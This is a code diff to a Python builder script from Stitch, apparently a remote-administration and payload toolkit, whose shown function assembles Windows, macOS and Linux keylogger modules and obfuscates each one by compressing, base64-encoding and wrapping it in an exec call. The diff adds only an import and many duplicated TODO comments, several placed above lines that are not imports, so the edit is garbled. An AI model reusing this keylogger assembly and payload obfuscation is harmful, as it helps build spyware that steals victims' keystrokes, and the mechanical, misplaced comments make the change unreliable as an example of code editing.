@@ -1,13 +1,26 @@
+import os
 # -*- coding: utf-8 -*-
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from .stitch_utils import *
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from .stitch_pyld_config import *
 
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from .Stitch_Vars.nsis import *
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from .Stitch_Vars.makeself import *
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from .Stitch_Vars.payload_code import *
+# TODO: Replace wildcard import with specific imports
+# TODO: Replace wildcard import with specific imports
 from .Stitch_Vars.payload_setup import *
 
 if windows_client():
@@ -75,12 +88,19 @@ def assemble_stitch():
     st_osx_kl     = get_osx_keylogger()
     st_lnx_kl     = get_lnx_keylogger()
 
+# TODO: Replace wildcard import with specific imports
     st_main       = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_main.encode())).decode())
+# TODO: Replace wildcard import with specific imports
     st_utils      = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_utils.encode())).decode())
+# TODO: Replace wildcard import with specific imports
     st_protocol   = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_protocol.encode())).decode())
+# TODO: Replace wildcard import with specific imports
     st_encryption = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_encryption.encode())).decode())
+# TODO: Replace wildcard import with specific imports
     st_win_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_win_kl.encode())).decode())
+# TODO: Replace wildcard import with specific imports
     st_osx_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_osx_kl.encode())).decode())
+# TODO: Replace wildcard import with specific imports
     st_lnx_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_lnx_kl.encode())).decode())
 
     main_script   = os.path.join(configuration_path,'st_main.py')
